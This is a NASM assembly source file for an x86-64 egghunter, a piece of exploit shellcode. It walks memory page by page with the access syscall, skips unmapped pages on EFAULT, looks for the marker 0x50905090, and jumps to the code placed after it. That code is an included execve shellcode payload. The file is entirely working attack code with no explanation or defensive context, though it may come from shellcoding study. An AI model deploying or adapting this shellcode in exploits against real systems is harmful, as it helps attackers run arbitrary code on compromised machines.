global _start
%define _START

section .data

    tag: dd 0x50905090

execve:
    %include "execve-stack.nasm"

section .text

_start:
    xor edx, edx
    xor esi, esi
skip_page:
    or dx, 0xfff   ; minimum page size is 4 kB on x86-(64)
skip_byte:
    inc rdx
    lea rdi, [rdx+0x4]
    push byte 21
    pop rax
    syscall
    cmp al, 0xf2   ; EFAULT (-14)
    jz skip_page
    mov eax, 0x50905090 - 1   ; subtract so that the hunter does not find itself
    inc eax
    push rdx
    pop rdi
    scasd
    jnz skip_byte
    jmp rdi
